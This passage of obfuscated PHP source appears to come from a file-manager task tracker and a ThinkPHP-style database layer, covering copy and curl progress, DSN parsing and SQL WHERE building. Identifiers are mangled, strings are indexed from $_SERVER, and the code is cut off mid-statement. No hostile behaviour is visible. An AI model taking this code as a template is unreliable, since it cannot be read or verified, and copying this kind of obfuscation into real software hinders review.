$Œ–ƒõã = Cache::get($š“†âÑØ[$şĞ®†Âã[404]] . $şĞ®†Âã[1634]); if (!$Œ–ƒõã || !file_exists($Œ–ƒõã)) { return $š“†âÑØ; } $š“†âÑØ[$şĞ®†Âã[1622]] = @filesize($Œ–ƒõã); $š“†âÑØ[$şĞ®†Âã[1626]] += $š“†âÑØ[$şĞ®†Âã[1622]]; self::updateTask($š“†âÑØ); return $š“†âÑØ; } public function copyFileEnd($åÒ×¾¨“, $·şÜ¥¼, $—Ø­ê¨æ, $õûËùÍÔ, $Ï¢”ƒ’‹, $ãÀ³±«Ş) { $Õ­ƒùÓ« =& $_SERVER[Á÷ ­Šë]; $üø‰¡Ã =& $this->task; $üø‰¡Ã[$Õ­ƒùÓ«[1622]] = $üø‰¡Ã[$Õ­ƒùÓ«[1621]]; $üø‰¡Ã[$Õ­ƒùÓ«[1623]] = $Õ­ƒùÓ«[33]; unset($üø‰¡Ã[$Õ­ƒùÓ«[1594]]); if ($Ï¢”ƒ’‹ == $üø‰¡Ã[$Õ­ƒùÓ«[1619]]) { $üø‰¡Ã[$Õ­ƒùÓ«[1625]] += $üø‰¡Ã[$Õ­ƒùÓ«[1621]]; $üø‰¡Ã[$Õ­ƒùÓ«[1626]] = $üø‰¡Ã[$Õ­ƒùÓ«[1625]]; $this->update(1); } else { $this->update(); $üø‰¡Ã[$Õ­ƒùÓ«[1622]] = 0; } Cache::remove($üø‰¡Ã[$Õ­ƒùÓ«[404]] . $Õ­ƒùÓ«[1634]); self::log($Õ­ƒùÓ«[1637] . $·şÜ¥¼ . $Õ­ƒùÓ«[77] . $õûËùÍÔ . $Õ­ƒùÓ«[62] . $Ï¢”ƒ’‹ . $Õ­ƒùÓ«[1638] . $üø‰¡Ã[$Õ­ƒùÓ«[1619]]); } public function updateFileEnd($£ğÌç, $ı¿ ¬„Ø) { $®Æ°¦Ç± =& $_SERVER[Á÷ ­Šë]; $ò½ªïÑ =& $this->task; $ò½ªïÑ[$®Æ°¦Ç±[1619]] = $£ğÌç; $ò½ªïÑ[$®Æ°¦Ç±[1621]] = $ı¿ ¬„Ø; $ò½ªïÑ[$®Æ°¦Ç±[1625]] += $ı¿ ¬„Ø; $ò½ªïÑ[$®Æ°¦Ç±[1626]] = $ò½ªïÑ[$®Æ°¦Ç±[1625]]; $this->update(1); self::log($®Æ°¦Ç±[1639] . $£ğÌç); } public function sourceModelCopy($Éêô²¼½) { $ª•şöõ¶ =& $_SERVER[Á÷ ­Šë]; $ĞúşôŞ = $Éêô²¼½[0]; $ ˆŒäÖ¶ = $Éêô²¼½[1]; $“Ë–ß…• =& $this->task; $this->sourceModelCopyFlag = !0; $¸†ŞŒç = 0; switch ($ĞúşôŞ) { case $ª•şöõ¶[570]: $¸†ŞŒç = 1; break; case $ª•şöõ¶[573]: $“Ë–ß…•[$ª•şöõ¶[1619]] = $ ˆŒäÖ¶[$ª•şöõ¶[28]]; break; case $ª•şöõ¶[575]: $¸†ŞŒç = intval($Éêô²¼½[$ª•şöõ¶[387]] * 0.4); break; case $ª•şöõ¶[577]: $¸†ŞŒç = intval($Éêô²¼½[$ª•şöõ¶[387]] * 0.2); break; case $ª•şöõ¶[579]: $¸†ŞŒç = intval($Éêô²¼½[$ª•şöõ¶[387]] * 0.4); break; } $this->update($¸†ŞŒç); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¯—‚æÜÖ, $ºÔí³ªü) { $õÄ­˜Ä =& $_SERVER[Á÷ ­Šë]; $this->sourceModelCopyFlag = !0; $àôçİÛ = 1; if (isset($¯—‚æÜÖ[$õÄ­˜Ä[91]])) { $àôçİÛ = $¯—‚æÜÖ[$õÄ­˜Ä[91]][$õÄ­˜Ä[89]] + $¯—‚æÜÖ[$õÄ­˜Ä[91]][$õÄ­˜Ä[90]] + 1; } $this->update($àôçİÛ); $this->sourceModelCopyFlag = !1; } public function sourceMove($«„½—‚ü) { $this->sourceRemove($«„½—‚ü, !1); } public function curlProgress($€œ¦ÒØ‘, $İ¹õçòş, $Œ–‹á¬‹, $†§òÎ¢ğ, $»´‰–„½) { $Í×‰•İ =& $_SERVER[Á÷ ­Šë]; $ÄŒñ‚¡ˆ =& $this->task; if ($»´‰–„½ > 0) { $ÄŒñ‚¡ˆ[$Í×‰•İ[1057]] = $Í×‰•İ[1640]; $ÄŒñ‚¡ˆ[$Í×‰•İ[1623]] = $Í×‰•İ[117]; if ($ÄŒñ‚¡ˆ[$Í×‰•İ[1621]]) { $ÄŒñ‚¡ˆ[$Í×‰•İ[1622]] = $»´‰–„½; } if ($ÄŒñ‚¡ˆ[$Í×‰•İ[1624]]) { $ÄŒñ‚¡ˆ[$Í×‰•İ[1622]] = $»´‰–„½ + $ÄŒñ‚¡ˆ[$Í×‰•İ[1624]]; } } else { if ($Œ–‹á¬‹ > 0) { if ($ÄŒñ‚¡ˆ[$Í×‰•İ[1621]] == $İ¹õçòş) { $ÄŒñ‚¡ˆ[$Í×‰•İ[1622]] = $Œ–‹á¬‹; $ÄŒñ‚¡ˆ[$Í×‰•İ[1057]] = $Í×‰•İ[1641]; $ÄŒñ‚¡ˆ[$Í×‰•İ[1623]] = $Í×‰•İ[1125]; } } } $this->update(); } public function curlProgressStart($½í§‘€) { } public function curlProgressEnd($ÜÆö¬Ö) { $Ù“ù‰€ =& $_SERVER[Á÷ ­Šë]; $¯ËÚæ¸ =& $this->task; $æú¶ÆÍœ = curl_getinfo($ÜÆö¬Ö); $”‘”Ï” = $æú¶ÆÍœ[$Ù“ù‰€[1642]]; if ($”‘”Ï” == -1) { $”‘”Ï” = $æú¶ÆÍœ[$Ù“ù‰€[1643]]; } if ($¯ËÚæ¸[$Ù“ù‰€[1623]] == $Ù“ù‰€[117] && $”‘”Ï”) { $¯ËÚæ¸[$Ù“ù‰€[1624]] += $”‘”Ï”; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $÷Ñ»ÜÈü =& $_SERVER[Á÷ ­Šë]; $ş‰ÆĞçë =& $this->task; $ş‰ÆĞçë[$÷Ñ»ÜÈü[1644]] = 1; Hook::bind($÷Ñ»ÜÈü[1613], array($this, $÷Ñ»ÜÈü[1645])); Hook::bind($÷Ñ»ÜÈü[1615], array($this, $÷Ñ»ÜÈü[1646])); Hook::bind($÷Ñ»ÜÈü[1617], array($this, $÷Ñ»ÜÈü[1647])); } protected function endAfter() { $°×ôú¹• =& $_SERVER[Á÷ ­Šë]; Hook::unbind($°×ôú¹•[1613], array($this, $°×ôú¹•[1645])); Hook::unbind($°×ôú¹•[1615], array($this, $°×ôú¹•[1646])); Hook::unbind($°×ôú¹•[1617], array($this, $°×ôú¹•[1647])); } public function progressStart($…áˆ»ßå) { $€œ¦­ˆ =& $_SERVER[Á÷ ­Šë]; $„©‹€Ãç = curl_getinfo($…áˆ»ßå); self::log($€œ¦­ˆ[1648] . $„©‹€Ãç[$€œ¦­ˆ[314]]); self::valueSet($this->task[$€œ¦­ˆ[404]], $this->task); } public function progressEnd($¥—ñİÁ±) { $ü“ñÒâ£ =& $_SERVER[Á÷ ­Šë]; self::log($ü“ñÒâ£[1649] . $this->task[$ü“ñÒâ£[404]]); $this->end(); } public function progress($„†ÏüØ, $—€åÂ©, $ÈíäÑË†, $ı«›Œ†™, $ä…Û³ù¶) { $¼˜ú¬ò =& $_SERVER[Á÷ ­Šë]; $¨€¯‡ğè =& $this->task; if ($ä…Û³ù¶ > 0) { $¨€¯‡ğè[$¼˜ú¬ò[1055]] = $¨€¯‡ğè[$¼˜ú¬ò[1055]] == 0 ? $ı«›Œ†™ : $¨€¯‡ğè[$¼˜ú¬ò[1055]]; $¨€¯‡ğè[$¼˜ú¬ò[1575]] = $ä…Û³ù¶; } else { if ($ÈíäÑË† > 0) { $¨€¯‡ğè[$¼˜ú¬ò[1055]] = $¨€¯‡ğè[$¼˜ú¬ò[1055]] == 0 ? $—€åÂ© : $¨€¯‡ğè[$¼˜ú¬ò[1055]]; $¨€¯‡ğè[$¼˜ú¬ò[1575]] = $ÈíäÑË†; } } $this->update(); self::log("\x70\162\x6f\x67\x72\x65\163\x73\110\164\164\x70\72\144\157\167\156\72{$ÈíäÑË†}\57{$—€åÂ©}\x3b\x20\165\x70\154\x6f\x61\144\x3a{$ä…Û³ù¶}\x2f{$ı«›Œ†™}\73"); } } goto D»÷Íƒ£‹; d„Ÿçšê„: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\x65\161" => "\74\76", "\147\164" => "\x3e", "\145\147\164" => "\76\75", "\154\x74" => "\x3c", "\x65\154\x74" => "\x3c\x3d", "\156\157\x74\154\x69\x6b\145" => "\x4e\117\x54\x20\114\x49\x4b\105", "\154\x69\153\145" => "\114\111\113\x45", "\x69\156" => "\x49\116", "\156\157\164\151\156" => "\116\117\x54\x20\111\116", "\x6e\157\x74\40\x69\x6e" => "\116\117\x54\x20\111\116", "\x62\x65\164\167\145\145\x6e" => "\102\x45\124\x57\105\x45\116", "\156\157\x74\x62\145\164\167\145\145\156" => "\116\117\124\40\102\x45\124\x57\105\105\x4e", "\156\x6f\x74\40\x62\x65\x74\167\x65\145\156" => "\116\x4f\124\x20\102\x45\124\x57\105\105\116"); protected $selectSql = "\123\x45\114\x45\x43\124\x25\104\111\x53\x54\x49\x4e\103\124\x25\x20\45\106\x49\x45\x4c\x44\45\x20\x46\122\117\115\x20\x25\124\101\x42\114\105\45\45\112\x4f\x49\x4e\45\x25\x57\x48\x45\122\105\x25\x25\x47\122\x4f\125\x50\45\x25\x48\101\126\x49\116\107\x25\x25\117\x52\104\105\x52\45\x25\114\111\x4d\x49\x54\45\x20\x25\x55\x4e\x49\x4f\x4e\45\45\x43\117\115\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $§‘ ƒæ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Á÷ ­Šë][954], $§‘ ƒæ); } public function factory($—«æúú = '') { $úİş¶·® =& $_SERVER[Á÷ ­Šë]; $—«æúú = $this->parseConfig($—«æúú); if (empty($—«æúú[$úİş¶·®[955]])) { think_exception(think_lang($úİş¶·®[956])); } $this->dbType = ucwords(strtolower($—«æúú[$úİş¶·®[955]])); $–ÌÖ¯ğ– = $úİş¶·®[957] . $this->dbType; if (class_exists($–ÌÖ¯ğ–)) { $İ‡ášÙ = new $–ÌÖ¯ğ–($—«æúú); if ($úİş¶·®[792] != strtolower($—«æúú[$úİş¶·®[955]])) { $İ‡ášÙ->dbType = strtoupper($this->dbType); } else { $İ‡ášÙ->dbType = $this->_getDsnType($—«æúú[$úİş¶·®[910]]); } } else { think_exception(think_lang($úİş¶·®[958]) . $úİş¶·®[959] . $–ÌÖ¯ğ–); } return $İ‡ášÙ; } public function __call($ÖÔ¼¸ë”, $ÒÔ—¸ƒö) { if (method_exists($this, $ÖÔ¼¸ë”)) { return call_user_func_array(array($this, $ÖÔ¼¸ë”), $ÒÔ—¸ƒö); } } protected function _getDsnType($ü“­±À) { $ã•°—ì» = explode($_SERVER[Á÷ ­Šë][4], $ü“­±À); $Û·³®å = strtoupper(trim($ã•°—ì»[0])); return $Û·³®å; } private function parseConfig($¡¶ÒşÛÕ = '') { $‹™Í½Š =& $_SERVER[Á÷ ­Šë]; if (!empty($¡¶ÒşÛÕ) && is_string($¡¶ÒşÛÕ)) { $¡¶ÒşÛÕ = $this->parseDSN($¡¶ÒşÛÕ); } elseif (is_array($¡¶ÒşÛÕ)) { $¡¶ÒşÛÕ = array_change_key_case($¡¶ÒşÛÕ); $¡¶ÒşÛÕ = array($‹™Í½Š[955] => $¡¶ÒşÛÕ[$‹™Í½Š[791]], $‹™Í½Š[883] => $¡¶ÒşÛÕ[$‹™Í½Š[960]], $‹™Í½Š[884] => $¡¶ÒşÛÕ[$‹™Í½Š[961]], $‹™Í½Š[881] => $¡¶ÒşÛÕ[$‹™Í½Š[962]], $‹™Í½Š[882] => $¡¶ÒşÛÕ[$‹™Í½Š[963]], $‹™Í½Š[17] => $¡¶ÒşÛÕ[$‹™Í½Š[964]], $‹™Í½Š[910] => $¡¶ÒşÛÕ[$‹™Í½Š[793]], $‹™Í½Š[13] => isset($¡¶ÒşÛÕ[$‹™Í½Š[965]]) ? $¡¶ÒşÛÕ[$‹™Í½Š[965]] : array()); } elseif (empty($¡¶ÒşÛÕ)) { if (think_config($‹™Í½Š[966]) && $‹™Í½Š[792] != strtolower(think_config($‹™Í½Š[967]))) { $¡¶ÒşÛÕ = $this->parseDSN(think_config($‹™Í½Š[966])); } else { $¡¶ÒşÛÕ = array($‹™Í½Š[955] => think_config($‹™Í½Š[967]), $‹™Í½Š[883] => think_config($‹™Í½Š[968]), $‹™Í½Š[884] => think_config($‹™Í½Š[969]), $‹™Í½Š[881] => think_config($‹™Í½Š[970]), $‹™Í½Š[882] => think_config($‹™Í½Š[971]), $‹™Í½Š[17] => think_config($‹™Í½Š[253]), $‹™Í½Š[910] => think_config($‹™Í½Š[966]), $‹™Í½Š[13] => think_config($‹™Í½Š[972])); } } return $¡¶ÒşÛÕ; } protected function initConnect($ÀÄï’©– = true) { if (1 == think_config($_SERVER[Á÷ ­Šë][18])) { $this->_linkID = $this->multiConnect($ÀÄï’©–); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¡Ù¬ïëÇ => $î¯Ëø§ô) { $this->_linkID = $î¯Ëø§ô; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ñ¢êÓûà = false) { $¿³‘¼ş =& $_SERVER[Á÷ ­Šë]; static $æ¸âŸ = array(); static $¶†½¢»Ì = -1; if (empty($æ¸âŸ)) { foreach ($this->config as $ÜÂÆ”„ => $˜÷şµè) { $æ¸âŸ[$ÜÂÆ”„] = explode($¿³‘¼ş[47], $˜÷şµè); } } if (think_config($¿³‘¼ş[973])) { if ($Ñ¢êÓûà || think_config($¿³‘¼ş[400]) === !0) { $‰ú‚×Ñğ = floor(mt_rand(0, think_config($¿³‘¼ş[974]) - 1)); $¶†½¢»Ì = $‰ú‚×Ñğ; } else { if (is_numeric(think_config($¿³‘¼ş[975]))) { $‰ú‚×Ñğ = think_config($¿³‘¼ş[975]); } else { $‰ú‚×Ñğ = floor(mt_rand(think_config($¿³‘¼ş[974]), count($æ¸âŸ[$¿³‘¼ş[881]]) - 1)); } } } else { $‰ú‚×Ñğ = floor(mt_rand(0, count($æ¸âŸ[$¿³‘¼ş[881]]) - 1)); $¶†½¢»Ì = $‰ú‚×Ñğ; } $‰ú‚×Ñğ = $¶†½¢»Ì !== -1 ? $¶†½¢»Ì : $‰ú‚×Ñğ; $à›èÆ¯ = array($¿³‘¼ş[883] => isset($æ¸âŸ[$¿³‘¼ş[883]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[883]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[883]][0], $¿³‘¼ş[884] => isset($æ¸âŸ[$¿³‘¼ş[884]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[884]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[884]][0], $¿³‘¼ş[881] => isset($æ¸âŸ[$¿³‘¼ş[881]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[881]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[881]][0], $¿³‘¼ş[882] => isset($æ¸âŸ[$¿³‘¼ş[882]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[882]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[882]][0], $¿³‘¼ş[17] => isset($æ¸âŸ[$¿³‘¼ş[17]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[17]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[17]][0], $¿³‘¼ş[910] => isset($æ¸âŸ[$¿³‘¼ş[910]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[910]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[910]][0], $¿³‘¼ş[13] => isset($æ¸âŸ[$¿³‘¼ş[13]][$‰ú‚×Ñğ]) ? $æ¸âŸ[$¿³‘¼ş[13]][$‰ú‚×Ñğ] : $æ¸âŸ[$¿³‘¼ş[13]][0]); return $this->connect($à›èÆ¯, $‰ú‚×Ñğ); } public function parseDSN($è¦Ëîó¬) { $´ĞÜğŞÁ =& $_SERVER[Á÷ ­Šë]; if (empty($è¦Ëîó¬)) { return !1; } $—ÃéÚ¥ = parse_url($è¦Ëîó¬); if ($—ÃéÚ¥[$´ĞÜğŞÁ[184]]) { $ÇÍ´Å• = array($´ĞÜğŞÁ[955] => $—ÃéÚ¥[$´ĞÜğŞÁ[184]], $´ĞÜğŞÁ[883] => isset($—ÃéÚ¥[$´ĞÜğŞÁ[598]]) ? $—ÃéÚ¥[$´ĞÜğŞÁ[598]] : $´ĞÜğŞÁ[33], $´ĞÜğŞÁ[884] => isset($—ÃéÚ¥[$´ĞÜğŞÁ[976]]) ? $—ÃéÚ¥[$´ĞÜğŞÁ[976]] : $´ĞÜğŞÁ[33], $´ĞÜğŞÁ[881] => isset($—ÃéÚ¥[$´ĞÜğŞÁ[185]]) ? $—ÃéÚ¥[$´ĞÜğŞÁ[185]] : $´ĞÜğŞÁ[33], $´ĞÜğŞÁ[882] => isset($—ÃéÚ¥[$´ĞÜğŞÁ[186]]) ? $—ÃéÚ¥[$´ĞÜğŞÁ[186]] : $´ĞÜğŞÁ[33], $´ĞÜğŞÁ[17] => isset($—ÃéÚ¥[$´ĞÜğŞÁ[86]]) ? substr($—ÃéÚ¥[$´ĞÜğŞÁ[86]], 1) : $´ĞÜğŞÁ[33]); } else { preg_match($´ĞÜğŞÁ[977], trim($è¦Ëîó¬), $îİ×ºÎ); $ÇÍ´Å• = array($´ĞÜğŞÁ[955] => $îİ×ºÎ[1], $´ĞÜğŞÁ[883] => $îİ×ºÎ[2], $´ĞÜğŞÁ[884] => $îİ×ºÎ[3], $´ĞÜğŞÁ[881] => $îİ×ºÎ[4], $´ĞÜğŞÁ[882] => $îİ×ºÎ[5], $´ĞÜğŞÁ[17] => $îİ×ºÎ[6]); } $ÇÍ´Å•[$´ĞÜğŞÁ[910]] = $´ĞÜğŞÁ[33]; return $ÇÍ´Å•; } protected function debug() { $¨¸´úÓ¿ =& $_SERVER[Á÷ ­Šë]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¨¸´úÓ¿[978]; if (think_config($¨¸´úÓ¿[979])) { think_status($¨¸´úÓ¿[980]); think_trace($this->queryStr . $¨¸´úÓ¿[981] . think_status($¨¸´úÓ¿[20], $¨¸´úÓ¿[980], 6) . $¨¸´úÓ¿[982], $¨¸´úÓ¿[33], $¨¸´úÓ¿[983]); } } protected function parseLock($®ÒÑ§¾ = false) { $“Ù™ˆµÜ =& $_SERVER[Á÷ ­Šë]; if (!$®ÒÑ§¾) { return $“Ù™ˆµÜ[33]; } if ($“Ù™ˆµÜ[912] == $this->dbType) { return $“Ù™ˆµÜ[984]; } return $“Ù™ˆµÜ[985]; } protected function parseSet($Ö÷½ƒûĞ) { $Ê…ä­œ¥ =& $_SERVER[Á÷ ­Šë]; foreach ($Ö÷½ƒûĞ as $Ùˆ€«ËÅ => $Áá«´¥Î) { if (is_array($Áá«´¥Î) && $Ê…ä­œ¥[304] == $Áá«´¥Î[0]) { $šÍ©ç¯°[] = $this->parseKey($Ùˆ€«ËÅ) . $Ê…ä­œ¥[986] . $Áá«´¥Î[1]; } elseif (is_scalar($Áá«´¥Î) || is_null($Áá«´¥Î)) { $šÍ©ç¯°[] = $this->parseKey($Ùˆ€«ËÅ) . $Ê…ä­œ¥[986] . $this->parseValue($Áá«´¥Î); } } return $Ê…ä­œ¥[987] . implode($Ê…ä­œ¥[47], $šÍ©ç¯°); } protected function bindParam($Ş‰¿¹ß×, $ÚÜÆ›Ñ¦) { $this->bind[$_SERVER[Á÷ ­Šë][4] . $Ş‰¿¹ß×] = $ÚÜÆ›Ñ¦; } protected function parseBind($ÂëËÚÜ) { $ÂëËÚÜ = array_merge($this->bind, $ÂëËÚÜ); $this->bind = array(); return $ÂëËÚÜ; } function parseKey(&$ÒŒ¾¾Ô¨, $è•‹‰˜ = true) { if ($è•‹‰˜) { $ÒŒ¾¾Ô¨ = $this->parseKeyCheck($ÒŒ¾¾Ô¨); } return $ÒŒ¾¾Ô¨; } function parseKeyCheck($ÖØ—§ÌÑ) { $“ºÒÈø =& $_SERVER[Á÷ ­Šë]; $ÖØ—§ÌÑ = trim($ÖØ—§ÌÑ); if (!preg_match($“ºÒÈø[988], $ÖØ—§ÌÑ)) { think_exception($“ºÒÈø[989] . $ÖØ—§ÌÑ); } return $ÖØ—§ÌÑ; } protected function parseValue($‘Ô Á±Ø) { $¢×¢›ö =& $_SERVER[Á÷ ­Šë]; if (is_string($‘Ô Á±Ø)) { $‘Ô Á±Ø = $¢×¢›ö[951] . $this->escapeString($‘Ô Á±Ø) . $¢×¢›ö[951]; } elseif (isset($‘Ô Á±Ø[0]) && is_string($‘Ô Á±Ø[0]) && strtolower($‘Ô Á±Ø[0]) == $¢×¢›ö[304]) { $‘Ô Á±Ø = $this->escapeString($‘Ô Á±Ø[1]); } elseif (is_array($‘Ô Á±Ø)) { $‘Ô Á±Ø = array_map(array($this, $¢×¢›ö[952]), $‘Ô Á±Ø); } elseif (is_bool($‘Ô Á±Ø)) { $‘Ô Á±Ø = $‘Ô Á±Ø ? $¢×¢›ö[97] : $¢×¢›ö[201]; } elseif (is_null($‘Ô Á±Ø)) { $‘Ô Á±Ø = $¢×¢›ö[113]; } return $‘Ô Á±Ø; } protected function parseField($‹¬œÅØé) { $â‡²¿˜ù =& $_SERVER[Á÷ ­Šë]; if (is_string($‹¬œÅØé) && strpos($‹¬œÅØé, $â‡²¿˜ù[47])) { $‹¬œÅØé = explode($â‡²¿˜ù[47], $‹¬œÅØé); } if (is_array($‹¬œÅØé)) { $áÖëŞæ = array(); foreach ($‹¬œÅØé as $µÏâñ©† => $÷š»›Ïî) { if (!is_numeric($µÏâñ©†)) { $áÖëŞæ[] = $this->parseKey($µÏâñ©†, !1) . $â‡²¿˜ù[990] . $this->parseKey($÷š»›Ïî); } else { $áÖëŞæ[] = $this->parseKey($÷š»›Ïî); } } $¢û¯€Ğ¥ = implode($â‡²¿˜ù[47], $áÖëŞæ); } elseif (is_string($‹¬œÅØé) && !empty($‹¬œÅØé)) { $¢û¯€Ğ¥ = $‹¬œÅØé; } else { $¢û¯€Ğ¥ = $â‡²¿˜ù[192]; } return $¢û¯€Ğ¥; } protected function parseTable($‡¨¬èîô) { $Ş»¼Ìö =& $_SERVER[Á÷ ­Šë]; if (is_array($‡¨¬èîô)) { $Öæ›¡æğ = array(); foreach ($‡¨¬èîô as $Á«ÕŞÈ => $ÁªÒ¯Šµ) { if (!is_numeric($Á«ÕŞÈ)) { $Öæ›¡æğ[] = $this->parseKey($Á«ÕŞÈ) . $Ş»¼Ìö[50] . $this->parseKey($ÁªÒ¯Šµ); } else { $Öæ›¡æğ[] = $this->parseKey($Á«ÕŞÈ); } } $‡¨¬èîô = $Öæ›¡æğ; } elseif (is_string($‡¨¬èîô)) { if (strstr($‡¨¬èîô, $Ş»¼Ìö[50])) { return $‡¨¬èîô; } $‡¨¬èîô = explode($Ş»¼Ìö[47], $‡¨¬èîô); array_walk($‡¨¬èîô, array($this, $Ş»¼Ìö[901])); } return $Ş»¼Ìö[895] . trim(implode($Ş»¼Ìö[991], $‡¨¬èîô), $Ş»¼Ìö[392]) . $Ş»¼Ìö[895]; } protected function parseWhere($ÃÀ°Ä¼) { $¼“ØøïÍ =& $_SERVER[Á÷ ­Šë]; $ôõäÍ¹ = $¼“ØøïÍ[33]; if (is_string($ÃÀ°Ä¼)) { $ôõäÍ¹ = $ÃÀ°Ä¼; } else { $ºóÙ… = isset($ÃÀ°Ä¼[$¼“ØøïÍ[992]]) ? strtoupper($ÃÀ°Ä¼[$¼“ØøïÍ[992]]) : $¼“ØøïÍ[33]; if (in_array($ºóÙ…, array($¼“ØøïÍ[993], $¼“ØøïÍ[994], $¼“ØøïÍ[995]))) { $ºóÙ… = $¼“ØøïÍ[50] . $ºóÙ… . $¼“ØøïÍ[50]; unset($ÃÀ°Ä¼[$¼“ØøïÍ[992]]); } else { $ºóÙ… = $¼“ØøïÍ[996]; } foreach ($ÃÀ°Ä¼ as $‡Ø§ßŠÏ => $îƒã³ìÍ) { $ôõäÍ¹ .= $¼“ØøïÍ[284]; if (is_numeric($‡Ø§ßŠÏ)) { $‡Ø§ßŠÏ = $¼“ØøïÍ[997]; } if (0 === strpos($‡Ø§ßŠÏ, $¼“ØøïÍ[81])) { $ôõäÍ¹ .= $this->parseThinkWhere($‡Ø§ßŠÏ, $îƒã³ìÍ); } else { if (!preg_match($¼“ØøïÍ[998], trim($‡Ø§ßŠÏ))) { think_exception(think_lang($¼“ØøïÍ[999]) . $¼“ØøïÍ[4] . $‡Ø§ßŠÏ); } $ã®šĞı = is_array($îƒã³ìÍ) && isset($îƒã³ìÍ[$¼“ØøïÍ[1000]]); $‡Ø§ßŠÏ = trim($‡Ø§ßŠÏ); if (strpos($‡Ø§ßŠÏ, $¼“ØøïÍ[290])) { $¤½ßÄå” = explode($¼“ØøïÍ[290], $‡Ø§ßŠÏ); $ƒ×Äæ² = array(); foreach ($¤½ßÄå” as $ˆÅ¹†—® => $º×»“Í) { $œ¢››Ù¾ = $ã®šĞı ? $îƒã³ìÍ[$ˆÅ¹†—®] : $îƒã³ìÍ; $ƒ×Äæ²[] = $¼“ØøïÍ[267] . $this->parseWhereItem($this->parseKey($º×»“Í), $œ¢››Ù¾) . $¼“ØøïÍ[900]; } $ôõäÍ¹ .= implode($¼“ØøïÍ[1001], $ƒ×Äæ²); } elseif (strpos($‡Ø§ßŠÏ, $¼“ØøïÍ[291])) { $¤½ßÄå” = explode($¼“ØøïÍ[291], $‡Ø§ßŠÏ); $ƒ×Äæ² = array(); foreach ($¤½ßÄå” as $ˆÅ¹†—® => $º×»“Í) { $œ¢››Ù¾ = $ã®šĞı ? $îƒã³ìÍ[$ˆÅ¹†—®] : $îƒã³ìÍ; $ƒ×Äæ²[] = $¼“ØøïÍ[267] . $this->parseWhereItem($this->parseKey($º×»“Í), $œ¢››Ù¾) . $¼“ØøïÍ[900]; } $ôõäÍ¹ .= implode($¼“ØøïÍ[996], $ƒ×Äæ²); } else { $ôõäÍ¹ .= $this->parseWhereItem($this->parseKey($‡Ø§ßŠÏ), $îƒã³ìÍ); } } $ôõäÍ¹ .= $¼“ØøïÍ[285] . $ºóÙ…; } $ôõäÍ¹ = substr($ôõäÍ¹, 0, -strlen($ºóÙ…)); } return empty($ôõäÍ¹) ? $¼“ØøïÍ[33] : $¼“ØøïÍ[1002] . $ôõäÍ¹; } protected function parseWhereItem($ÌŞà™¬¤, $©ì€—÷) { $¤‰äÕı =& $_SERVER[Á÷ ­Šë]; $Ãí«Äåè = $¤‰äÕı[33]; if (is_array($©ì€—÷)) { if (is_string($©ì€—÷[0])) { $¢ßğ«¢ç = strtolower($©ì€—÷[0]); if (in_array($©ì€—÷[0], array($¤‰äÕı[986], $¤‰äÕı[1003], $¤‰äÕı[1004], $¤‰äÕı[1005], $¤‰äÕı[1006], $¤‰äÕı[1007]))) { $Ãí«Äåè .= $ÌŞà™¬¤ . $¤‰äÕı[50] . $©ì€—÷[0] . $¤‰äÕı[50] . $this->parseValue($©ì€—÷[1]); } elseif (preg_match($¤‰äÕı[1008], $©ì€—÷[0])) { $Ãí«Äåè .= $ÌŞà™¬¤ . $¤‰äÕı[50] . $this->exp[$¢ßğ«¢ç] . $¤‰äÕı[50] . $this->parseValue($©ì€—÷[1]); } elseif (preg_match($¤‰äÕı[1009], $©ì€—÷[0])) { if (is_array($©ì€—÷[1])) { $†•ªçÎ = isset($©ì€—÷[2]) ? strtoupper($©ì€—÷[2]) : $¤‰äÕı[994]; if (in_array($†•ªçÎ, array($¤‰äÕı[993], $¤‰äÕı[994], $¤‰äÕı[995]))) { $ô×û‰²Ä = array(); foreach ($©ì€—÷[1] as $ÔÄ®¶ÀÏ) { $ô×û‰²Ä[] = $ÌŞà™¬¤ . $¤‰äÕı[50] . $this->exp[$¢ßğ«¢ç] . $¤‰äÕı[50] . $this->parseValue($ÔÄ®¶ÀÏ); } $Ãí«Äåè .= $¤‰äÕı[267] . implode($¤‰äÕı[50] . $†•ªçÎ . $¤‰äÕı[50], $ô×û‰²Ä) . $¤‰äÕı[900]; } } else { $Ãí«Äåè .= $ÌŞà™¬¤ . $¤‰äÕı[50] . $this->exp[$¢ßğ«¢ç] . $¤‰äÕı[50] . $this->parseValue($©ì€—÷[1]); } } elseif ($¤‰äÕı[304] == $¢ßğ«¢ç) { $Ãí«Äåè .= $¤‰äÕı[898] . $ÌŞà™¬¤ . $¤‰äÕı[50] . $©ì€—÷[1] . $¤‰äÕı[1010]; } elseif (preg_match($¤‰äÕı[1011], $©ì€—÷[0])) { $Ãí«Äåè .= $©ì€—÷[0]; } elseif (preg_match($¤‰äÕı[1012], $©ì€—÷[0])) { if 